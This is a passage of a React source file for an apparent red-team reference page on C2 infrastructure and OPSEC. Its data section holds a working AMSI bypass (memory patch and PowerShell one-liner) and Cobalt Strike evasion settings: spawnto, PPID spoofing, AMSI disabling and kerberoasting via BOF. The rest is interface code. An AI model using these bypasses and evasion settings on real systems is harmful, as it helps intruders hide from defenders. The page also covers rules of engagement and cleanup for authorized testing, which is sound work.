    *(BYTE*)addr = 0xC3;   // RET
    VirtualProtect(addr, 1, old, &old);
}

// AMSI bypass — PowerShell
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils') |
  ::GetField('amsiInitFailed','NonPublic,Static') |
  ::SetValue($null,$true)`
      }
    ]
  },
  {
    id: 'opsec',
    title: 'OPSEC — Operational Security Principles',
    subtitle: 'Minimize footprint, avoid attribution, and operate without triggering EDR or alerting the blue team prematurely',
    tags: ['OPSEC', 'footprint', 'attribution', 'BOF', 'spawnto', 'PPID spoof', 'sleep mask', 'engagement planning', 'artefact cleanup'],
    accentColor: 'green',
    overview: 'Operational security controls what the blue team can see and respond to. Every unnecessary process spawn, disk write, or network connection is a detection opportunity. OPSEC means choosing the least visible technique for every task: BOF over execute-assembly, LDAP query over port scan, named pipe over new TCP connection. Two questions before every action: "Will this generate an event log entry?" and "Will this create a process or file that an EDR will inspect?"',
    steps: [
      'Document every action, every artefact, and every credential used — timestamped operator log throughout the engagement',
      'Before every task: Will this write to disk? Spawn a new process? Create a network connection? Generate an event log entry?',
      'Prefer BOFs (CS inline-execute) and --in-process extensions (Sliver) over fork-and-run for all sensitive tasks',
      'Set spawnto immediately on every new Beacon: dllhost.exe, svchost.exe, RuntimeBroker.exe',
      'PPID spoofing: make sacrificial processes appear to be children of Explorer or another trusted process',
      'Never inject into csrss.exe, winlogon.exe, or AV/EDR processes — these cause immediate blue team response',
      'Rotate sleep values between implants — a constant 60s sleep is itself detectable as a pattern',
      'Post-engagement cleanup: remove all beacons, persistence, dropped files, created accounts, and SPNs',
      'Define RoE, deconfliction channel, and shared IOC list with blue team before engagement start',
    ],
    commands: [
      {
        title: 'Cobalt Strike OPSEC checklist',
        code: `# === IMMEDIATELY on new Beacon check-in ===

# 1. Set spawnto BEFORE any fork-and-run
spawnto x64 %windir%\\sysnative\\dllhost.exe
spawnto x86 %windir%\\syswow64\\dllhost.exe

# 2. Set sleep/jitter
sleep 60 25

# 3. profile post-ex block (applies for all sessions)
post-ex {
    set spawnto_x64  "%windir%\\sysnative\\dllhost.exe";
    set spawnto_x86  "%windir%\\syswow64\\dllhost.exe";
    set pipename     "msrpc_#####";
    set ppid         "explorer.exe";
    set obfuscate    "true";
    set amsi_disable "true";
}

# Per-task checklist before running anything:
# Q: Writes to disk?   → use in-memory alternative or BOF
# Q: Spawns process?   → use BOF (inline-execute) instead
# Q: EDR signatures?   → run ThreatCheck first
# Q: Event log entry?  → use BOF, avoid shell/execute-assembly

# NOISY: execute-assembly /tools/Rubeus.exe kerberoast
# OPSEC: inline-execute /tools/bofs/kerberoast.o

# Artefact tracker (keep throughout engagement)
# FILE:     C:\\Windows\\Temp\\update.exe          dropped 09:15
# REG:      HKCU\\Software\\Microsoft\\wupdater   removed 10:32
# SERVICE:  WinUpdateSvc                          created 09:20, deleted 10:33
# SPN:      fake/temp.corp.local                  added 09:30, cleared 09:31`
      }
    ]
  },
];

export default function C2OPSEC() {
  const { columns, setColumns, allCards, addCustomCard, updateCard, deleteCard, reorderCards } = usePageStorage('c2opsec', initialMapColumns, techniques);
  const [modalStep, setModalStep] = useState(null);
  const [columnName, setColumnName] = useState('');
  const [selectedColor, setSelectedColor] = useState('cyan');
  const [addingTopicCol, setAddingTopicCol] = useState(null);
  const [topicTitle, setTopicTitle] = useState('');
  const [topicTags, setTopicTags] = useState('');
  const [cardModalOpen, setCardModalOpen] = useState(false);
  const [editingCard, setEditingCard] = useState(null);
  const handleCardSubmit = (card) => { if (editingCard) { updateCard(card); setEditingCard(null); } else addCustomCard(card); };

  const colorOptions = [
    { value: 'cyan', name: 'Cyan' }, { value: 'green', name: 'Green' }, { value: 'red', name: 'Red' }, { value: 'purple', name: 'Purple' },
    { value: 'orange', name: 'Orange' }, { value: 'pink', name: 'Pink' }, { value: 'blue', name: 'Blue' }, { value: 'yellow', name: 'Yellow' },
  ];
  const colorPreview = { cyan: 'bg-cyan-500', green: 'bg-emerald-500', red: 'bg-red-500', purple: 'bg-purple-500', orange: 'bg-orange-500', pink: 'bg-pink-500', blue: 'bg-blue-500', yellow: 'bg-yellow-500' };
  const headerColorMap = { cyan: 'text-cyan-400 border-cyan-500/30', green: 'text-emerald-400 border-emerald-500/30', red: 'text-red-400 border-red-500/30', purple: 'text-purple-400 border-purple-500/30', orange: 'text-orange-400 border-orange-500/30', pink: 'text-pink-400 border-pink-500/30', blue: 'text-blue-400 border-blue-500/30', yellow: 'text-yellow-400 border-yellow-500/30' };

  const handleAddColumnStart = () => setModalStep('name');
  const handleNameSubmit = () => { if (columnName.trim()) setModalStep('color'); };
  const handleColorSubmit = () => { setColumns([...columns, { header: columnName.toUpperCase(), color: selectedColor, nodes: [] }]); setModalStep(null); setSelectedColor('cyan'); setColumnName(''); };
  const handleDeleteColumn = (index) => setColumns(columns.filter((_, i) => i !== index));
  const handleAddTopic = (colIndex) => {
    if (topicTitle.trim()) {
      const updated = [...columns];
      updated[colIndex].nodes.push({ title: topicTitle, subtitle: 'Add details here', tags: topicTags.split(',').map(t => t.trim()).filter(t => t) });
      setColumns(updated); setAddingTopicCol(null); setTopicTitle(''); setTopicTags('');
    }
  };
  const handleDeleteTopic = (colIndex, nodeIndex) => { const updated = [...columns]; updated[colIndex].nodes.splice(nodeIndex, 1); setColumns(updated); };
  const scrollTo = (id) => { const el = document.getElementById(id); if (el) el.scrollIntoView({ behavior: 'smooth', block: 'start' }); };
  return (
    <div className="space-y-12">
      <div className="text-center mb-10">
        <h1 className="text-3xl md:text-5xl font-bold font-mono tracking-tight">
          <span className="text-slate-200">Infrastructure & </span><span className="text-cyan-400">OPSEC</span>
        </h1>
        <p className="text-slate-500 font-mono text-sm mt-3">Cobalt Strike • Sliver • Redirectors • Malleable C2 • BOFs • Shellcode Runners • OPSEC</p>
      </div>
      
      <div className="overflow-x-auto pb-4">
        <div className="inline-flex gap-4 min-w-max">
          {columns.map((col, i) => {
            const color = col.color || 'cyan';
            const hColors = headerColorMap[color];
            return (
              <div key={i} className="flex flex-col gap-2 min-w-[180px] max-w-[200px] relative">
                <div className={`text-center py-2 border-b-2 mb-2 ${hColors} flex items-center justify-between px-2`}>
                  <span className="font-mono text-[11px] font-bold tracking-[0.2em] uppercase flex-1">
                    {col.header}
                  </span>
                  <button
                    onClick={() => handleDeleteColumn(i)}
                    className="text-slate-500 hover:text-slate-300 transition-colors p-0.5"
                    title="Delete column"
                  >
                    <X className="w-3 h-3" />
                  </button>
                </div>
                <div className="flex flex-col gap-2 border border-slate-800/50 rounded-lg p-2 bg-[#0d1117]">
                  {col.nodes.map((node, j) => (
                    <div key={j} className="flex items-start gap-1 group">
                      <div className="flex-1 min-w-0">
                        <MapNode
                          title={node.title}
                          subtitle={node.tags && node.tags.length > 0 ? node.tags.join(' • ') : node.subtitle}
                          accentColor={color}
                          small
                        />
                      </div>
                      <button
                        onClick={() => handleDeleteTopic(i, j)}
                        className="text-slate-600 hover:text-red-400 transition-colors p-0.5 flex-shrink-0 opacity-0 group-hover:opacity-100"
                        title="Delete topic"
                      >
                        <X className="w-3 h-3" />
                      </button>
                    </div>
                  ))}
                  
                  {addingTopicCol === i ? (
                    <div className="flex flex-col gap-1">
                      <input
                        type="text"
                        value={topicTitle}
                        onChange={(e) => setTopicTitle(e.target.value)}
                        placeholder="Topic name"
                        className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500"
                        autoFocus
                        onKeyDown={(e) => {
                          if (e.key === 'Escape') {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }
                        }}
                      />
                      <input
                        type="text"
                        value={topicTags}
                        onChange={(e) => setTopicTags(e.target.value)}
                        placeholder="Tags (comma-separated)"
                        className="px-2 py-1 bg-slate-800 border border-slate-700 rounded text-slate-200 placeholder-slate-500 font-mono text-xs focus:outline-none focus:border-slate-500"
                        onKeyDown={(e) => {
                          if (e.key === 'Enter') handleAddTopic(i);
                          if (e.key === 'Escape') {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }
                        }}
                      />
                      <div className="flex gap-1">
                        <button
                          onClick={() => handleAddTopic(i)}
                          className="flex-1 px-2 py-1 bg-cyan-600 hover:bg-cyan-700 text-white text-xs font-mono rounded transition-colors"
                        >
                          Add
                        </button>
                        <button
                          onClick={() => {
                            setAddingTopicCol(null);
                            setTopicTitle('');
                            setTopicTags('');
                          }}
                          className="flex-1 px-2 py-1 bg-slate-700 hover:bg-slate-600 text-slate-300 text-xs font-mono rounded transition-colors"
                        >
                          Cancel
                        </button>
                      </div>
                    </div>
                  ) : (
                    <button
                      onClick={() => setAddingTopicCol(i)}
                      className="px-2 py-1 text-xs font-mono text-slate-500 hover:text-slate-300 border border-dashed border-slate-700 rounded hover:border-slate-500 transition-colors"
                    >
                      + Add Topic
                    </button>
                  )}
                </div>
              </div>
            );
          })}
          
          {/* Add Column Button */}
          <div className="flex flex-col gap-2 min-w-[180px] max-w-[200px]">
            <button
              onClick={handleAddColumnStart}
              className="h-full flex flex-col items-center justify-center gap-2 border-2 border-dashed border-slate-700 rounded-lg p-4 hover:border-slate-500 hover:bg-slate-800/20 transition-all"
            >
              <Plus className="w-6 h-6 text-slate-500" />
              <span className="text-xs font-mono text-slate-500 text-center">Add Column</span>
            </button>
          </div>
        </div>
      </div>

      {/* Modal for Adding Column */}
      {modalStep && (
        <div className="fixed inset-0 bg-black/50 flex items-center justify-center z-50">
          <div className="bg-[#0d1117] border border-slate-800 rounded-lg p-6 max-w-sm w-full mx-4">
            {modalStep === 'name' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Column Name</h3>
                <input
                  type="text"
                  value={columnName}
                  onChange={(e) => setColumnName(e.target.value)}
                  placeholder="e.g., Custom Category"
                  className="w-full px-3 py-2 bg-slate-800 border border-slate-700 rounded-lg text-slate-200 placeholder-slate-500 font-mono text-sm focus:outline-none focus:border-slate-500"
                  autoFocus
                  onKeyDown={(e) => e.key === 'Enter' && handleNameSubmit()}
                />
                <div className="flex gap-2">
                  <button
                    onClick={() => setModalStep(null)}
                    className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm"
                  >
                    Cancel
                  </button>
                  <button
                    onClick={handleNameSubmit}
                    className="flex-1 px-4 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 transition-colors font-mono text-sm font-semibold"
                  >
                    Next
                  </button>
                </div>
              </div>
            )}

            {modalStep === 'color' && (
              <div className="space-y-4">
                <h3 className="text-lg font-mono font-bold text-slate-200">Choose Color</h3>
                <div className="flex flex-col gap-2 max-h-64 overflow-y-auto">
                  {colorOptions.map((option) => (
                    <button
                      key={option.value}
                      onClick={() => setSelectedColor(option.value)}
                      className={`px-4 py-2 rounded-lg text-sm font-mono font-semibold transition-all flex items-center gap-2 ${
                        selectedColor === option.value
                          ? `${colorPreview[option.value]} text-slate-900`
                          : 'bg-slate-800 text-slate-300 hover:bg-slate-700'
                      }`}
                    >
                      <div className={`w-3 h-3 rounded-full ${colorPreview[option.value]}`} />
                      {option.name}
                    </button>
                  ))}
                </div>
                <div className="flex gap-2">
                  <button
                    onClick={() => setModalStep('name')}
                    className="flex-1 px-4 py-2 bg-slate-800 text-slate-300 rounded-lg hover:bg-slate-700 transition-colors font-mono text-sm"
                  >
                    Back
                  </button>
                  <button
                    onClick={handleColorSubmit}
                    className="flex-1 px-4 py-2 bg-cyan-600 text-white rounded-lg hover:bg-cyan-700 transition-colors font-mono text-sm font-semibold"
                  >
                    Create
                  </button>
                </div>
              </div>
            )}
          </div>
        </div>
      )}
      <div className="flex items-center justify-between pt-4">
        <button onClick={() => setCardModalOpen(true)} className="px-3 py-1.5 bg-cyan-600 hover:bg-cyan-700 text-white text-xs font-mono rounded transition-colors flex items-center gap-1">
          <Plus className="w-3 h-3" /> Add Technique
        </button>
      </div>
      <AddCardModal isOpen={cardModalOpen || !!editingCard} onClose={() => { setCardModalOpen(false); setEditingCard(null); }} onSubmit={handleCardSubmit} editCard={editingCard} />
      <div className="border-t border-slate-800/50 pt-10">
        <DraggableCardList cards={allCards} onDelete={deleteCard} onReorder={reorderCards} onEdit={(card) => setEditingCard(card)} />
      </div>
    </div>
  );
}